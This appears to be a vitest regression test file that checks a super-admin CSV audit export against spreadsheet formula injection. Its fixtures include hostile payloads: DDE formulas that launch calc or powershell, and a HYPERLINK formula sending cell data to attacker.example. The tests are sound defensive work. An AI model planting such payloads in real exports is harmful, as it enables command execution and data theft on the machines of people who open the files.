import { describe, it, beforeAll, afterAll, expect } from "vitest";
import request from "supertest";
import { db } from "@workspace/db";
import { usersTable, traderProfilesTable, traderAuditLogTable } from "@workspace/db/schema";
import { inArray, eq } from "drizzle-orm";
import app from "../app";
import { generateToken } from "../lib/auth";

/**
 * Regression tests for CSV formula injection in the super-admin audit export
 * (GET /api/admin/audit-report?format=csv).
 *
 * Trader-controlled fields (businessName, notes) must never yield a CSV cell
 * whose value starts with a spreadsheet formula trigger (=, +, -, @, tab, CR):
 * such cells execute as formulas when opened in Excel / LibreOffice Calc.
 * The escape helper neutralises them with a leading single-quote.
 *
 * Fixtures are scoped with a unique action string, and the export is filtered
 * by ?action= so concurrent test data can never leak into these assertions.
 */

const SUFFIX = `${Date.now()}-${Math.floor(Math.random() * 1e6)}`;
const TEST_ACTION = `CSV_INJECTION_TEST_${SUFFIX}`;
const emailFor = (label: string) => `csv-injection+${label}-${SUFFIX}@example.test`;

// Trader-controlled payloads that must be neutralised in the export.
const BUSINESS_NAME_PAYLOAD = `=2+5+cmd|' /C calc'!A0`;
const HYPERLINK_PAYLOAD = `=HYPERLINK("https://attacker.example/exfil?d="&A1,"Click here")`;
const NOTE_PAYLOADS = [
  HYPERLINK_PAYLOAD,
  "+SUM(A1:A9)",
  "-2+3",
  "@cmd|' /C powershell'!A1",
  "\t=tabbed-formula",
  "\r=carriage-formula",
];
const BENIGN_NOTE = "Routine check 5-star (hyphen mid-string is fine)";

const createdUserIds: number[] = [];

let superAdminToken: string;
let plainAdminToken: string;
let traderUserId: number;

/** Minimal RFC-4180 cell parser so assertions see what a spreadsheet sees. */
function parseCsvLine(line: string): string[] {
  const cells: string[] = [];
  let cur = "";
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (inQuotes) {
      if (ch === '"') {
        if (line[i + 1] === '"') {
          cur += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        cur += ch;
      }
    } else if (ch === '"') {
      inQuotes = true;
    } else if (ch === ",") {
      cells.push(cur);
      cur = "";
    } else {
      cur += ch;
    }
  }
  cells.push(cur);
  return cells;
}

async function createUser(
  role: "customer" | "trader" | "admin",
  label: string,
  extra: Partial<typeof usersTable.$inferInsert> = {},
): Promise<number> {
  const [u] = await db
    .insert(usersTable)
    .values({
      email: emailFor(`${role}-${label}`),
      passwordHash: "$2a$10$test.hash.not.used.for.login",
      fullName: `Csv Injection ${role} ${label}`,
      role,
      isActive: true,
      emailVerified: true,
      ...extra,
    })
    .returning({ id: usersTable.id });
  createdUserIds.push(u.id);
  return u.id;
}

async function fetchCsv(): Promise<string> {
  const res = await request(app)
    .get("/api/admin/audit-report")
    .query({ format: "csv", action: TEST_ACTION })
    .set("Authorization", `Bearer ${superAdminToken}`);
  expect(res.status).toBe(200);
  expect(res.headers["content-type"]).toContain("text/csv");
  return res.text;
}

beforeAll(async () => {
  const superAdminId = await createUser("admin", "super", { isSuperAdmin: true });
  superAdminToken = generateToken(superAdminId, "admin", 1);
  const plainAdminId = await createUser("admin", "plain");
  plainAdminToken = generateToken(plainAdminId, "admin", 1);

  // Trader whose businessName is a formula payload (attacker-controlled at signup).
  traderUserId = await createUser("trader", "attacker");
  await db.insert(traderProfilesTable).values({
    userId: traderUserId,
    businessName: BUSINESS_NAME_PAYLOAD,
    contactName: "Csv Attacker",
    email: emailFor("profile"),
    phone: "+447000000002",
    mainCategory: "plumbing",
    town: "London",
    postcode: "SW1A 1AA",
    isActive: true,
  });

  // Audit entries carrying attacker-controlled notes, plus a benign one and a
  // JSON details row whose *internal* '=' must stay untouched.
  await db.insert(traderAuditLogTable).values([
    ...NOTE_PAYLOADS.map((notes) => ({
      userId: traderUserId,
      action: TEST_ACTION,
      performedBy: superAdminId,
      notes,
    })),
    { userId: traderUserId, action: TEST_ACTION, performedBy: superAdminId, notes: BENIGN_NOTE },
    {
      userId: traderUserId,
      action: TEST_ACTION,
      performedBy: superAdminId,
      notes: null,
      details: { formula: "=1+1", list: [1, 2] },
    },
  ]);
});

afterAll(async () => {
  await db.delete(traderAuditLogTable).where(eq(traderAuditLogTable.action, TEST_ACTION));
  if (createdUserIds.length > 0) {
    await db.delete(traderProfilesTable).where(inArray(traderProfilesTable.userId, createdUserIds));
    await db.delete(usersTable).where(inArray(usersTable.id, createdUserIds));
  }
});

describe("GET /api/admin/audit-report?format=csv — formula injection", () => {
  it("requires super admin (plain admin gets 403)", async () => {
    const res = await request(app)
      .get("/api/admin/audit-report")
      .query({ format: "csv", action: TEST_ACTION })
      .set("Authorization", `Bearer ${plainAdminToken}`);
    expect(res.status).toBe(403);
  });

  it("no cell in the export starts with a formula trigger character", async () => {
    const csv = await fetchCsv();
    const [header, ...dataLines] = csv.split("\n");
    expect(header).toContain("businessName");
    // All 8 fixture rows must be present (scoped by the unique action).
    expect(dataLines.length).toBe(NOTE_PAYLOADS.length + 2);
    for (const line of dataLines) {
      for (const cell of parseCsvLine(line)) {
        // What the spreadsheet sees after CSV parsing must never begin with
        // =, +, -, @, tab or CR — that is exactly what triggers execution.
        expect(cell).not.toMatch(/^[=+\-@\t\r]/);
      }
    }
  });

  it("neutralises each payload with a leading single-quote, preserving content", async () => {
    const csv = await fetchCsv();
    const rows = csv.split("\n").slice(1).map(parseCsvLine);
    const NOTES_COL = 7;
    const BUSINESS_COL = 5;

    const noteCells = rows.map((r) => r[NOTES_COL]);
    for (const payload of NOTE_PAYLOADS) {
      expect(noteCells).toContain(`'${payload}`);
      expect(noteCells).not.toContain(payload);
    }
    // businessName joins onto every row and must be neutralised everywhere.
    for (const row of rows) {
      expect(row[BUSINESS_COL]).toBe(`'${BUSINESS_NAME_PAYLOAD}`);
    }
  });

  it("does not mangle benign values or JSON internals", async () => {
    const csv = await fetchCsv();
    const rows = csv.split("\n").slice(1).map(parseCsvLine);
    const noteCells = rows.map((r) => r[7]);
    expect(noteCells).toContain(BENIGN_NOTE);

    const detailCells = rows.map((r) => r[8]);
    // JSON.stringify output starts with '{' (no prefix needed); the '=' inside
    // the JSON string is harmless and must survive byte-for-byte.
    expect(detailCells).toContain(JSON.stringify({ formula: "=1+1", list: [1, 2] }));
  });
});
